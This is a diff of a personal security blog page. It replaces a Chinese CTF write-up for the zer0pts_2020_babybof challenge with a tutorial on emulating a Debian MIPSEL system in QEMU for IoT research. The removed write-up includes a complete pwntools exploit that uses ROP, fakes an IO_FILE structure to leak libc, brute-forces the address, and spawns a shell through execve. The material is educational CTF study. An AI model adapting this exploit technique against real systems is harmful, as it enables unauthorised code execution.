@@ -19,30 +19,27 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="代码分析main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不能">
+    <meta name="description" content="DDDD近期准备西湖论剑的比赛，之前对IOT安全这方面有着一丢丢的研究，这篇来主要讲一下qemu模拟，以及我遇到的槽点，特别是针对于使用WSL的 为什么要用qemu模拟笔者之前在复现路由器等漏洞的时候，都是用qemu的用户模拟，我们需要去patch一些东西才可以完成模拟，并且在qemu的用户模拟下，我们不能完完全全的模拟真实的环境 因此我们可能会用到工具类似于FirmAE等等，但是这类工具模拟出来">
 <meta property="og:type" content="article">
-<meta property="og:title" content="zer0pts_2020_babybof">
-<meta property="og:url" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/index.html">
+<meta property="og:title" content="IOT-qenu模拟">
+<meta property="og:url" content="https://feng-zz-pwn.github.io/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/index.html">
 <meta property="og:site_name" content="Feng_ZZ">
-<meta property="og:description" content="代码分析main函数  main函数下就只有一个read函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:printf、puts，在遇到这种情况，很有可能是要利用read函数的偏移去得到syscall的gadget，所以我们现在检查一下程序的保护机制 保护机制  很明显我们上面想的操作并不能实现，因为RELRO保护是Full RELRO，我们不能修改got表，所以并不能">
+<meta property="og:description" content="DDDD近期准备西湖论剑的比赛，之前对IOT安全这方面有着一丢丢的研究，这篇来主要讲一下qemu模拟，以及我遇到的槽点，特别是针对于使用WSL的 为什么要用qemu模拟笔者之前在复现路由器等漏洞的时候，都是用qemu的用户模拟，我们需要去patch一些东西才可以完成模拟，并且在qemu的用户模拟下，我们不能完完全全的模拟真实的环境 因此我们可能会用到工具类似于FirmAE等等，但是这类工具模拟出来">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/111.png">
-<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/222.png">
-<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/333.png">
-<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/444.png">
-<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/555.png">
-<meta property="article:published_time" content="2024-02-26T06:10:27.000Z">
-<meta property="article:modified_time" content="2024-02-26T07:41:26.883Z">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312112634522.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312113846749.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312114709689.png">
+<meta property="article:published_time" content="2024-03-12T02:44:47.000Z">
+<meta property="article:modified_time" content="2024-03-12T03:51:30.195Z">
 <meta property="article:author" content="Feng_ZZ">
-<meta property="article:tag" content="BUUCTF">
-<meta property="article:tag" content="做题复现">
+<meta property="article:tag" content="IOT">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://feng-zz-pwn.github.io/2024/02/26/zer0pts-2020-babybof/111.png">
+<meta name="twitter:image" content="https://feng-zz-pwn.github.io/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312112634522.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>zer0pts_2020_babybof · Feng_ZZ&#39;s Studio</title>
+    <title>IOT-qenu模拟 · Feng_ZZ&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -268,7 +265,7 @@
                 <a href="/">笔记 &amp; WP</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">zer0pts_2020_babybof</a>
+                <a href="#" class="post-name">IOT-qenu模拟</a>
             </div>
         </div>
     
@@ -314,7 +311,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                zer0pts_2020_babybof
+                IOT-qenu模拟
             <!-- 404 -->
             
         </h1>
@@ -334,9 +331,7 @@
                     <div class= post-intro-tags >
     
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="BUUCTF">BUUCTF</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="做题复现">做题复现</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="IOT">IOT</a>
     
 </div>
 
@@ -350,7 +345,7 @@
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/02/26</span>
+                    <span class="post-intro-time">2024/03/12</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -505,43 +500,86 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a><code>main</code>函数</h4><img src="/2024/02/26/zer0pts-2020-babybof/111.png" class="" title="label">
+        <h1 id="DDDD"><a href="#DDDD" class="headerlink" title="DDDD"></a>DDDD</h1><p>近期准备西湖论剑的比赛，之前对<code>IOT</code>安全这方面有着一丢丢的研究，这篇来主要讲一下<code>qemu</code>模拟，以及我遇到的槽点，特别是针对于使用<code>WSL</code>的</p>
+<h2 id="为什么要用qemu模拟"><a href="#为什么要用qemu模拟" class="headerlink" title="为什么要用qemu模拟"></a>为什么要用<code>qemu</code>模拟</h2><p>笔者之前在复现路由器等漏洞的时候，都是用<code>qemu</code>的用户模拟，我们需要去<code>patch</code>一些东西才可以完成模拟，并且在<code>qemu</code>的用户模拟下，我们不能完完全全的模拟真实的环境</p>
+<p>因此我们可能会用到工具类似于<code>FirmAE</code>等等，但是这类工具模拟出来的系统有时候并不能完全可以使用，我们可以进入系统内解决，但有时候系统都进不去还是蛮搞的，因此研究<code>qemu</code>的系统模拟就显得尤为重要了</p>
+<h2 id="网上常见的qemu模拟"><a href="#网上常见的qemu模拟" class="headerlink" title="网上常见的qemu模拟"></a>网上常见的<code>qemu</code>模拟</h2><p>基本上是直接用安装好系统的磁盘占大多，主要是图个方便，可以参考这个<a target="_blank" rel="noopener" href="https://oneda1sy.gitee.io/2021/02/28/MIPS-Qemu-deployment/">文章</a></p>
+<p>但是抱着如果以后的固件系统的<code>glibc</code>版本会越来越高，最好是学习一下怎么安装一个<code>qemu</code>系统</p>
+<h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><blockquote>
+<p>这里是参考这个大佬的<a target="_blank" rel="noopener" href="https://oneshell.top/2022/09/20/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%AF%E6%AD%A3%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84mipsel%E8%99%9A%E6%8B%9F%E6%9C%BA/">文章</a></p>
+</blockquote>
+<p>首先我们肯定是要安装<code>qemu</code>的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-system-mipsel qemu-utils</span><br></pre></td></tr></table></figure>
 
-<p><code>main</code>函数下就只有一个<code>read</code>函数，且是一个很明显的栈溢出漏洞，但是程序没有其他能够可以泄露出来的函数例如:<code>printf</code>、<code>puts</code>，在遇到这种情况，很有可能是要利用<code>read</code>函数的偏移去得到<code>syscall</code>的<code>gadget</code>，所以我们现在检查一下程序的保护机制</p>
-<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><img src="/2024/02/26/zer0pts-2020-babybof/222.png" class="" title="label">
+<h3 id="下载系统必要文件"><a href="#下载系统必要文件" class="headerlink" title="下载系统必要文件"></a>下载系统必要文件</h3><p>我们可以通过这个<a target="_blank" rel="noopener" href="http://ftp.debian.org/debian/dists/stable/main/installer-mipsel/current/images/malta/netboot/">网址</a>去看现在的<code>debian</code>的系统，我们主要也是下载最重要的安装&amp;启动文件，这里我们用<code>wget</code>下载下来</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.debian.org/debian/dists/stable/main/installer-mipsel/current/images/malta/netboot/initrd.gz</span><br></pre></td></tr></table></figure>
 
-<p>很明显我们上面想的操作并不能实现，因为<code>RELRO</code>保护是<code>Full RELRO</code>，我们不能修改got表，所以并不能修改read的libc地址，所以下面我们最好是看看有没有可以利用的gadget</p>
-<h3 id="搜索gadget"><a href="#搜索gadget" class="headerlink" title="搜索gadget"></a>搜索gadget</h3><img src="/2024/02/26/zer0pts-2020-babybof/333.png" class="" title="label">
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.debian.org/debian/dists/stable/main/installer-mipsel/current/images/malta/netboot/vmlinuz-6.1.0-18-4kc-malta</span><br></pre></td></tr></table></figure>
 
-<p>这里发现了在<code>0x000000000040043e</code>的<code>gadget</code> ：<code>call qword ptr [rbp + 0x48]</code></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以控制<code>rbp</code>地址为存放我们要执行的地址<code>-0x48</code>的位置就可以指向该地址的指令，所以网上看到的大多数解法都是修改<code>stderr</code>等在<code>bss</code>段上的libc地址，通过爆破<code>1/4096</code>次概率<code>getshell</code>，但是做这题时，我想到<code>pwnable.tw</code>上的一道题**<code>De-ASLR</code>**，通过这题了解到了我们可以利用<code>stderr</code>等<code>IO_File</code>地址实现泄露libc地址，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2063695">这是学习文章</a></p>
-<p>所以我随之想到了可以利用这个方法实现，在文章中它使用条件是</p>
-<ul>
-<li>利用<code>gets</code>函数在<code>bss</code>上留下<code>_IO_2_1_stdin</code>地址</li>
-<li>利用<code>_libc_csu_init</code>的上的<code>gadget</code>精确定位地址我们要的<code>__IO_file_write</code>函数</li>
-<li>在<code>bss</code>上伪造<code>fileno==1</code>和<code>flag2==2</code>满足<code>__IO_file_write</code>函数泄露地址要求</li>
-</ul>
-<p>我们在上面有只有一个不满足即是这个程序编译时没有<code>_libc_csu_init</code>所以我们无法精确定位对应的位置，所以我们这里大概率还是需要去猜地址</p>
-<p>所以我们现在需要看看<code>_IO_2_1_stder</code>等地址与<code>__IO_file_write</code>函数距离是多少，如果只是后2字节不一样，那么我们只用爆破<code>1/16</code>次的概率</p>
-<h4 id="gdb找偏移"><a href="#gdb找偏移" class="headerlink" title="gdb找偏移"></a><code>gdb</code>找偏移</h4><img src="/2024/02/26/zer0pts-2020-babybof/444.png" class="" title="label">
+<h3 id="创建磁盘"><a href="#创建磁盘" class="headerlink" title="创建磁盘"></a>创建磁盘</h3><p>这里这个磁盘也就是我们安装系统的系统盘</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 debian.qcow2 8g</span><br></pre></td></tr></table></figure>
 
-<p>可以很明显看到，这个偏移不会超过两个字节，所以我们现在爆破概率就变成了<code>1/16</code>的概率</p>
-<p>所以我们现在就只需要修改<code>stderr</code>的值为存放<code>__IO_file_write</code>函数的地址值，通过<code>leave_ret</code>栈迁移到这个位置上(当然也可以<code>pop rbp</code>)，使得<code>rbp</code>等于存放<code>__IO_file_write</code>函数的地址值</p>
-<p>然后再<code>bss</code>上伪造<code>fake_IO_FILE</code>，实际上就是满足<code>fileno==1</code>和<code>flag2==2</code>其他都可以不用管，然后在我们设置好<code>__IO_file_write</code>函数调用的参数：</p>
-<ul>
-<li><code>fake_IO_FILE</code></li>
-<li>泄露地址</li>
-<li>泄露大小</li>
-</ul>
-<p>然后我们就可以泄露出来libc地址了，再通过我们栈布局提前布置<code>ROP</code>在构造一个<code>read</code>，就可以继续写入<code>ROP chain</code>，然后<code>getshell</code></p>
-<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>我们<code>call qword ptr [rbp + 0x48]</code>的<code>gadget</code>实际上是在<code>setup</code>函数偏移构成，所以我们还需要绕过这段函数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, offset stdin@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, offset stdout@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, offset stderr@@GLIBC_2_2_5</span><br><span class="line">mov     rdi, [rax]      ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<h3 id="安装-Debian-MIPSEL"><a href="#安装-Debian-MIPSEL" class="headerlink" title="安装 Debian MIPSEL"></a>安装 <code>Debian</code> <code>MIPSEL</code></h3><p>这里我们需要将上述的三个文件放到通过文件夹下，以便我们启动安装</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mipsel -M malta \</span><br><span class="line">  -m 256 -hda debian.qcow2 \</span><br><span class="line">  -kernel vmlinuz-5.10.0-18-4kc-malta \</span><br><span class="line">  -initrd initrd.gz \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 nokaslr&quot;</span> \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
 
-<p>因为此时此刻<code>stderr</code>已经被我们修改为存放<code>__IO_file_write</code>函数的地址值，这段肯定是通过不了，因为要一个IO_FILE结构指针，所以我们可以在<code>call __IO_file_write</code>前把<code>stderr</code>的值恢复回去(因为如果我们预测对了<code>__IO_file_write</code>的值，那么<code>stderr</code>的地址肯定也是那个值)，然后再执行就可以绕过去了</p>
-<p>并且我们不能直接用<code>system(&quot;/bin/sh&quot;)</code>，这里最好是用<code>execve(&quot;/bin/sh&quot;,0,0)</code>系统调用来<code>getshell</code></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;wt.exe&quot;</span>,<span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    p = process(name,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,29908)</span></span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fadff416758 _IO_file_write</span></span><br><span class="line"><span class="comment"># 0x7fadff418540 stderr</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000040049c</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040049e</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040047c</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400499</span></span><br><span class="line">stderr = <span class="number">0x0601040</span></span><br><span class="line">call = <span class="number">0x000000000040043e</span> <span class="comment"># call qword ptr [rbp + 0x48]</span></span><br><span class="line">ret = <span class="number">0x000000000040047d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    get_p(<span class="string">&quot;./zer0pts_2020_babybof&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- 修改stderr为存放_IO_file_write函数的地址值 并且在栈上布置ROP chain</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p64(stderr) + p64(pop_rsi) + p64(stderr) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr + <span class="number">0x200</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr+<span class="number">8</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p64(pop_rsi) + p64(stderr) + p64(leave_ret) </span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#sleep(2)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(p16(<span class="number">0x6758</span>-<span class="number">0x48</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">	<span class="comment"># ---------- 在bss上伪造fake_IO_FILE</span></span><br><span class="line">    p.send(p64(<span class="number">1</span>)+p64(<span class="number">2</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># ---------- 在bss上步骤ROP chain 并且栈迁移</span></span><br><span class="line">    p.send(p64(ret)*<span class="number">0x20</span> + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) +  p64(pop_rsi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(pop_rdi) + p64(stderr + <span class="number">0x200</span> - (<span class="number">0x8</span>*<span class="number">14</span>)) + p64(call)+ p64(<span class="number">0</span>)+ p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x6011a0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># 还原 stderr的值 泄露libc地址</span></span><br><span class="line">    p.send(p16(<span class="number">0x8540</span>))</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc.address == <span class="number">0</span> :</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        libc.address = <span class="number">0</span></span><br><span class="line">        pwn()</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        <span class="comment"># sleep(2)</span></span><br><span class="line">        system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">        pop_rax = <span class="number">0x0000000000033544</span> + libc.address</span><br><span class="line">        pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">        syscall = <span class="number">0x00000000000026bf</span> + libc.address </span><br><span class="line">        payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(pop_rdi) + p64(<span class="number">0x6011a0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+<p>安装过程基本上也跟参考文章一致，可以自己去对照操作，这里不重复搬运</p>
+<h3 id="安装-bootloader"><a href="#安装-bootloader" class="headerlink" title="安装 bootloader"></a>安装 <code>bootloader</code></h3><p>这里实际上就是提取我们启动系统磁盘的文件，在我们创建的磁盘的<code>/boot</code>文件下</p>
+<h4 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h4><p>因为这里<code>qemu</code>用<code>qcow2</code>的格式的磁盘，我们如果要挂在磁盘还需要其他的操作</p>
+<blockquote>
+<p>这里参考文章有点小小错误就是把磁盘以<code>img</code>结尾，导致我以为我一直没有安装成功</p>
+</blockquote>
+<h5 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe nbd mac_part=16</span><br><span class="line">sudo qemu-nbd -c /dev/nbd0 debian.qcow2</span><br><span class="line">sudo mount /dev/nbd0p1 /tmp/temp</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/02/26/zer0pts-2020-babybof/555.png" class="" title="label">
+<h5 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /tmp/temp/boot/initrd.img-5.10.0-18-4kc-malta .</span><br><span class="line"><span class="built_in">cp</span> -r /tmp/temp/boot/vmlinuz-6.1.0-18-4kc-malta .</span><br></pre></td></tr></table></figure>
+
+<h5 id="取消挂载"><a href="#取消挂载" class="headerlink" title="取消挂载"></a>取消挂载</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo umount /tmp/temp</span><br><span class="line">sudo qemu-nbd -d /dev/nbd0</span><br></pre></td></tr></table></figure>
+
+<h2 id="正式启动虚拟机"><a href="#正式启动虚拟机" class="headerlink" title="正式启动虚拟机"></a>正式启动虚拟机</h2><p><code>start.sh</code>脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta \</span><br><span class="line">  -m 1024 -hda debian.qcow2 \</span><br><span class="line">  -kernel vmlinuz-6.1.0-18-4kc-malta \</span><br><span class="line">  -initrd initrd.img-6.1.0-18-4kc-malta \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=ttyS0 nokaslr&quot;</span> \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312112634522.png" class="" title="image-20240312112634522">
+
+<h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><blockquote>
+<p>由于也是接触不久<code>qemu</code>，不算是最佳方案去联网，参考<a target="_blank" rel="noopener" href="https://zhou-yuxin.github.io/articles/2018/%E5%AE%89%E8%A3%85qemu-kvm%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AE%E6%A1%A5%E6%8E%A5%E7%BD%91%E7%BB%9C/index.html">文章</a></p>
+</blockquote>
+<h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install uml-utilities</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建一张虚拟TUN网卡"><a href="#创建一张虚拟TUN网卡" class="headerlink" title="创建一张虚拟TUN网卡"></a>创建一张虚拟TUN网卡</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u root <span class="comment"># 这里可以是你自己的用户名</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="将网卡设置为任何人都有权限使用："><a href="#将网卡设置为任何人都有权限使用：" class="headerlink" title="将网卡设置为任何人都有权限使用："></a>将网卡设置为任何人都有权限使用：</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 0666 /dev/net/tun</span><br></pre></td></tr></table></figure>
+
+<h4 id="设置ip地址"><a href="#设置ip地址" class="headerlink" title="设置ip地址"></a>设置<code>ip</code>地址</h4><p>不能跟自己本地的任何<code>ip</code>有冲突</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig tap0 192.168.2.1 up</span><br></pre></td></tr></table></figure>
+
+<h4 id="为虚拟机开启IP数据包转发"><a href="#为虚拟机开启IP数据包转发" class="headerlink" title="为虚拟机开启IP数据包转发"></a>为虚拟机开启<code>IP</code>数据包转发</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward   <span class="comment">#只能在root环境下执行</span></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以直接修改系统配置，以后就不用进入root去执行了</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment">#将 net.ipv4.ip_forward=0改为net.ipv4.ip_forward=1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="现在我们的启动脚本"><a href="#现在我们的启动脚本" class="headerlink" title="现在我们的启动脚本"></a>现在我们的启动脚本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta \</span><br><span class="line">  -m 1024 -hda debian.qcow2 \</span><br><span class="line">  -kernel vmlinuz-6.1.0-18-4kc-malta \</span><br><span class="line">  -initrd initrd.img-6.1.0-18-4kc-malta \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=ttyS0 nokaslr&quot;</span> \</span><br><span class="line">  -net nic -net tap,ifname=tap0 \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
+
+<h4 id="槽点"><a href="#槽点" class="headerlink" title="槽点"></a>槽点</h4><p>我们还需要进入到<code>qemu</code>系统里面去配置<code>IP</code>，而且容易掉<code>ip</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr add 192.168.2.2/24 dev &lt;虚拟的内部自己网卡&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/image-20240312113846749.png" class="" title="image-20240312113846749">
+
+<p>然后我们还需要设置网关</p>
